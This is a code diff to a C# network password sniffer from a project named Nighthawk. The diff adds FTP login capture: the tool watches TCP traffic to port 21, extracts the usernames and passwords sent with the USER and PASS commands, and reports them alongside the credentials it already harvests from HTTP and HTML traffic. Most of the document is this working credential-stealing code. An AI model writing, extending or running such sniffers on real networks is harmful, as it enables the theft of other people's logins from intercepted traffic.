@@ -2,10 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Web;
 using System.Net;
-using SharpPcap;
-using SharpPcap.WinPcap;
 using PacketDotNet;
 using System.Threading;
 
@@ -31,14 +28,11 @@ namespace Nighthawk
     /* Basic password sniffer (currently only HTTP, HTML) */
     public class Sniffer
     {
-        // current device
-        private WinPcapDevice device;
-
         // status
-        public bool Started = false;
+        public bool Started;
 
         // exclusion
-        private bool excludeLocalIP = false;
+        private bool excludeLocalIP;
         private DeviceInfo deviceInfo;
 
         // packet queues (packet store for BG thread to work on)
@@ -53,6 +47,9 @@ namespace Nighthawk
 
         // collection of POST requests (hostname/url tracking on incomplete packets)
         private List<SnifferPostRequest> postRequests;
+
+        // collection of FTP logins
+        private List<SnifferFTPlogin> ftpLogins;
 
         // events
         public event SnifferResultHandler SnifferResult;
@@ -92,9 +89,6 @@ namespace Nighthawk
         // constructor
         public Sniffer(DeviceInfo deviceInfo)
         {
-            // store our network interface
-            device = deviceInfo.Device;
-
             this.deviceInfo = deviceInfo;
         }
 
@@ -108,6 +102,7 @@ namespace Nighthawk
             Started = true;
 
             postRequests = new List<SnifferPostRequest>();
+            ftpLogins = new List<SnifferFTPlogin>();
 
             // start a worker thread
             worker = new Thread(new ThreadStart(Worker));
@@ -122,10 +117,10 @@ namespace Nighthawk
             Started = false;
 
             // stop worker thread
-            worker.Join();
+            if(worker != null && worker.IsAlive) worker.Join();
         }
         
-        // worker function that actually parses HTTP packets
+        // worker function that actually parses packets
         public void Worker()
         {
             // loop
@@ -147,23 +142,66 @@ namespace Nighthawk
                     // loop through packets
                     foreach (TcpPacket packet in threadQueue)
                     {
+                        // check for parent packet
+                        if (packet.ParentPacket == null) continue;
+
                         // check for exclusions
                         if (excludeLocalIP)
                         {
-                            if ((packet.ParentPacket as IpPacket).SourceAddress.ToString() == deviceInfo.IP || (packet.ParentPacket as IpPacket).DestinationAddress.ToString() == deviceInfo.IP)
+                            if (((IpPacket) packet.ParentPacket).SourceAddress.ToString() == deviceInfo.IP || ((IpPacket) packet.ParentPacket).DestinationAddress.ToString() == deviceInfo.IP)
                             {
                                 continue;
                             }
+                        }
+
+                        // get IP address
+                        var sourceIP = ((IpPacket) packet.ParentPacket).SourceAddress;
+                        var destIP = ((IpPacket) packet.ParentPacket).DestinationAddress;
+
+                        // check if FTP packet
+                        if (packet.DestinationPort == 21)
+                        {
+                            var logins = ftpLogins.Where(l => (l.DestinationAddress.ToString() == destIP.ToString() && l.SourceAddress.ToString() == sourceIP.ToString()));
+
+                            // parse TCP packet data
+                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";
+
+                            // check if connection already started
+                            if (logins.Count() > 0)
+                            {
+                                var login = logins.Last();
+
+                                // get user
+                                if (data.Length > 4 && data.Substring(0, 4) == "USER")
+                                {
+                                    var parts = data.Split(' ');
+                                    if(parts.Length > 1) login.User = parts[1].Replace("\r\n", "");
+                                }
+
+                                // get password
+                                if (data.Length > 4 && data.Substring(0, 4) == "PASS")
+                                {
+                                    var parts = data.Split(' ');
+                                    if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");
+
+                                    // create result
+                                    Result(login.DestinationAddress.ToString(), login.User, login.Password, "/", SnifferResultType.FTP);
+
+                                    ftpLogins.Remove(login);
+                                }
+                            }
+                            else
+                            {
+                                ftpLogins.Add(new SnifferFTPlogin { DestinationAddress = destIP, SourceAddress = sourceIP });
+                            }
+
+                            continue;
                         }
 
                         // parse HTTP packet
                         if (HttpPacket.IsHTTP(packet) || HttpPacket.HasPOST(packet))
                         {
                             var http = new HttpPacket(packet);
-
-                            // get IP address
-                            var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress;
-                            var destIP = (packet.ParentPacket as IpPacket).DestinationAddress;
 
                             // save hostnames
                             if (http.Header.Type == HttpHeader.PacketType.Request && http.Header.ReqType == HttpHeader.RequestType.POST)
@@ -184,6 +222,8 @@ namespace Nighthawk
                     Thread.Sleep(50);
                 }
             }
+
+            return;
         }
 
         // credentials search
@@ -293,7 +333,8 @@ namespace Nighthawk
     public enum SnifferResultType
     {
         HTTPAuth,
-        HTML
+        HTML,
+        FTP
     }
 
     // sniffer post request data
@@ -303,6 +344,15 @@ namespace Nighthawk
         public IPAddress DestinationAddress;
         public uint SequenceNumber;
         public string Hostname;
+    }
+
+    // sniffer FTP login data
+    public class SnifferFTPlogin
+    {
+        public IPAddress SourceAddress;
+        public IPAddress DestinationAddress;
+        public string User;
+        public string Password;
     }
 
     // OnSnifferResult event delegate
